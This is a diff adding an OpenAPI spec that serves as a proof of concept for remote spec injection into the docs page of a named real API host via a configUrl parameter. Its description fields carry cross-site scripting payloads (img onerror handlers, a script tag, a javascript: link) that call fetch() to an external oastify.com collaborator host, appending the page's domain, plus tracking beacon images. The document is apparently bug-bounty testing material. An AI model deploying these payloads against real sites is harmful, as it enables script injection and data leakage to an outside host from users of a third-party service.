@@ -1,0 +1,29 @@
+{
+  "openapi": "3.0.1",
+  "info": {
+    "title": "POC - Remote spec injection via configUrl [web3res]",
+    "description": "This spec is loaded from an **attacker-controlled URL** into api.d3-ai.dpdgroup.co.uk/docs via the `configUrl` query parameter.\n\n![beacon-info](https://3w0j785f6y3godjpd6ccy5dit9zcn1.oastify.com/render-info-desc)\n\nHTML sanitization test: <img src=x onerror=\"fetch('https://3w0j785f6y3godjpd6ccy5dit9zcn1.oastify.com/xss-info-desc-'+document.domain)\">\n\n<script>fetch('https://3w0j785f6y3godjpd6ccy5dit9zcn1.oastify.com/xss-script-'+document.domain)</script>\n\n[click me](javascript:fetch('https://3w0j785f6y3godjpd6ccy5dit9zcn1.oastify.com/xss-link-click-'+document.domain))",
+    "version": "1.0-poc"
+  },
+  "servers": [
+    { "url": "https://api.d3-ai.dpdgroup.co.uk" }
+  ],
+  "paths": {
+    "/POC": {
+      "get": {
+        "summary": "Attacker-controlled operation",
+        "description": "Rendered from remote attacker spec.\n\n<img src=x onerror=\"fetch('https://3w0j785f6y3godjpd6ccy5dit9zcn1.oastify.com/xss-path-desc-'+document.domain)\">\n\n![beacon-path](https://3w0j785f6y3godjpd6ccy5dit9zcn1.oastify.com/render-path-desc)",
+        "parameters": [
+          {
+            "name": "q",
+            "in": "query",
+            "required": false,
+            "description": "<img src=x onerror=\"fetch('https://3w0j785f6y3godjpd6ccy5dit9zcn1.oastify.com/xss-param-desc')\">",
+            "schema": { "type": "string" }
+          }
+        ],
+        "responses": { "200": { "description": "ok" } }
+      }
+    }
+  }
+}
